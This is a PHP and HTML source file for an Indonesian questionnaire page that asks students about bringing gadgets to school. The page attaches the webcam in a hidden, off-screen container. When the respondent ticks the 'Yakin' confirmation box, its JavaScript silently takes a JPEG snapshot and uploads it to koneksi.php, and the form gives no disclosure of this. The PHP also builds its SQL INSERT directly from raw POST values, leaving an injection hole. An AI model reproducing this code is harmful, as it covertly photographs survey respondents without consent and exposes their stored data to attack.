<?php
    $con = mysqli_connect("localhost", "root", "", "geocam");
if (!$con) {
    echo "Tidak bisa terhubung dengan database";
    }

if(isset($_POST["kirim"])){
    $answer = $_POST["klik"];
    $number = $_POST["number"];
    $query = "INSERT INTO `tb_quest`(`number`, `respon`) VALUES ('$number', '$answer')";
    mysqli_query($con,$query);

    echo 
    "
    <script>
    /*alert('HOREEE!!! Data kamu berhasil direkam :)');*/
    document.location.href = 'q2.php';
    </script>
    "
    ;
}
?>
<?php
    require 'koneksi.php';
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes">
        <link rel="icon" href="image/logo.png">
        <title>Quesioner</title>
    </head>

    <body onload = "configure();">        
        <div class="box" class="warp">
            <form class="myForm" action="" method="post" autocomplete="off">
                <div class="inputBox">
                    <p>1. Saya selalu membawa gadget ke sekolah.</p>
                    <div class="jawab">
                            <input type="hidden" name="number" value="nomer 1">
                            <input class="inputabs" type="radio" required id="SangatSetuju" name="klik" value="SangatSetuju">
                            <label for="SangatSetuju" class="jeneng">Sangat Setuju</label><br>
                            <input class="inputabs" type="radio" required id="Setuju" name="klik" value="Setuju">
                            <label for="Setuju" class="jeneng">Setuju</label><br>
                            <input class="inputabs" type="radio" required id="Netral" name="klik" value="Netral">
                            <label for="Netral" class="jeneng">Netral</label><br>
                            <input class="inputabs" type="radio" required id="TidakSetuju" name="klik" value="TidakSetuju">
                            <label for="TidakSetuju" class="jeneng">Tidak Setuju</label><br>
                            <input class="inputabs" type="radio" required id="SangatTidakSetuju" name="klik" value="SangatTidakSetuju">
                            <label for="SangatTidakSetuju" class="jeneng">Sangat Tidak Setuju</label><br>
                    </div>
                    <div class="tombol">
                            <input type="checkbox" id="checkbox-container" onclick="saveSnap()" required/>
                            <label for="checkbox" id="centang">Yakin</label>
                            <input type="submit" name="kirim" id="next" onclick="Ulang()" value=">Next>">
                            <i></i>
                    </div>
                </div>
            </form>
            <div class="container">
                <div id="my_camera">
                </div>
                <div id="results" style="visibility; hidden; position: absolute;">
                </div>
            </div>
        </div>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap');
            *{
                margin: 0 ;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Poppins', sans-serif;
            }
            .container{
                visibility: hidden;
                position: absolute; 
                right: 0; 
                bottom: 0;
                min-width: 100%; 
                min-height: 100%;
                width: auto; 
                height: auto; 
                z-index: -100;
                background-size: cover;
                overflow: hidden;
            }
            #my_camera{
            }
            body{
                display: flex;
                justify-content: center;
                align-items: center;   
                min-height: 100vh;
                background: url('image/bg.jpg')no-repeat;
                width: 100%;
                position: relative;
                margin: 0 auto;
                background-position: center;
                background-size: cover;

                
                user-select: none;
                -moz-user-select: none;
                -ms-user-select: none ;
                -webkit-user-select: none;  
            }

            .box
            {
                position: relative;
                width: 380px;
                height: 420px;
                background: transparent;
                border: 4px solid rgba(255,255,255,0.5);
                border-radius: 20px;
                backdrop-filter: blur(15px);
            }
            .box form
            {
                position: absolute;
                inset: 4px;
                border-radius: 12px;
                padding: 15px 15px;
                display: flex;
                flex-direction: column;  
                font-weight: 600;
                
            }
            
            .box form .inputBox p{
                text-align: center;
                text-align: justify;
                margin: 15px 5px;
                font-size: 1.2em;
                height: 90px;
            }
            
            .box form .inputBox .jawab
            {
                outline: none rebeccapurple;
                position: relative;
                margin: 25px 5px;
                padding: 10px 15px;
                font-size: 1.2em;
            }
            .box form .inputBox .inputabs{
                align-items: center;
                justify-content: center;
                margin: 5px 5px 10px 5px;
            }
            .box form .inputBox .tombol{
                outline: none rebeccapurple;
                margin: 10px 5px;
            }
            .box form .inputBox .tombol input[type="checkbox"]{
                float: left;
                width: 50px;
                margin-top: 5px;
                margin-left: 20px;

                cursor: pointer;
            }
            .box form .inputBox .tombol #centang{
                margin-left: -15px;
                
            }
            .box form .inputBox .tombol input[type="submit"]{
                float: right;
                margin-right: 40px;
                background: #23242a;
                color: #fff;
                cursor: pointer;
                border-width: 3px;
                border-radius: 8px;
                
                padding: 0px 2px 0px 2px;
            }
            .box form .tombol input[type="submit"]:hover,
            .box form .tombol input[type="submit"]:nth-child(1)
            {
                color: #45f3ff;
            }

            
        </style>
    </body>
    
    <script>
        function Ulang(){
            localStorage.clear();    
        }
    </script>
    <script src="assets/radio.js"></script>
        <script>
        $(document).ready(function(){
            if(localStorage.selected) {
                $('#' + localStorage.selected ).attr('checked', true);
            }
            $('.inputabs').click(function(){
            localStorage.setItem("selected", this.id);
            });
        });

        </script>
    <script src="assets/checkbox.js"></script>
    <script>
            function configure()    
            {
            Webcam.set({
                width: 720,
                height: 960,
                
                image_format: 'jpeg',
                jpeg_quality: 90,
            });

            Webcam.attach('#my_camera');
            
            }

            function saveSnap(){
                Webcam.snap(function(data_uri){
                    document.getElementById('results').innerHTML =
                        '<img id = "webcam" src = "'+data_uri+'">';
            });

            

            var base64image = document.getElementById("webcam").src;
            Webcam.upload(base64image, 'koneksi.php',function(code,text){
                
                document.location.href = "q1.php"
            });
            }
    </script>
    <script src="assets/jquery.js"></script>
        <script>
        // document ready handler
        // or $(document).ready(Function(){...
            jQuery(function($) {
                var checkboxValue = JSON.parse(localStorage.getItem('checkboxValue')) || {}
                var $checkbox = $("#checkbox-container");

                $checkbox.on("change", function() {
                $checkbox.each(function() {
                    checkboxValue[this.id] = this.checked;
                });
                localStorage.setItem("checkboxValue", JSON.stringify(checkboxValue));
                });

                //on page load
                $.each(checkboxValue, function(key, value) {
                $("#" + key).prop('checked', value);
                });
            });
        </script>
</html>